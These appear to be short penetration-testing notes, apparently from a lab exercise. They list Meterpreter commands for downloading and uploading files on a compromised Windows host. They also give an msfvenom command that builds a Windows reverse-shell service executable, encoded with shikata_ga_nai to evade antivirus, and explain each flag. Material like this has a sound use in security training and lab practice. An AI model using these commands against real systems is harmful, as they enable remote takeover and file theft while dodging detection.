##### ***Meterpreter shell***
You can download files to the machine by running this command:
```
download C:\Users\TargetUser\file.txt /local/direcotry
```

You can upload files buy using the `upload` command:
```
upload /path/to/file C:\
```
##### ***Msfvenon***
###### **Windows reverse shell over TCP**
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.20.218 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

this command creates a Windows service executable that, when run on a target machine, will attempt to connect back to the IP address `10.4.20.218` on port `4443` to provide a shell. The payload is encoded with `x86/shikata_ga_nai` to evade detection. The output file is named `Advanced.exe`.
- **Payload Type (`-p windows/shell_reverse_tcp`)**: The payload is a Windows reverse shell over TCP. When executed on a target machine, it will attempt to connect back to the specified IP and port, providing a shell to the attacker.
- **Local Host (`LHOST=10.4.20.218`)**: The IP address to which the reverse shell will attempt to connect back is set to `10.4.20.218`.
- **Local Port (`LPORT=4443`)**: The port on which the reverse shell will attempt to connect back is set to `4443`.
- **Encoder (`-e x86/shikata_ga_nai`)**: The payload will be encoded using the `x86/shikata_ga_nai` encoder to help evade basic antivirus or intrusion detection systems.
- **Format (`-f exe-service`)**: The payload will be formatted as a Windows service executable. This means it's designed to be installed as a service on the target machine, which could allow it to persist across reboots.
- **Output (`-o Advanced.exe`)**: The generated payload will be saved as a file named `Advanced.exe`.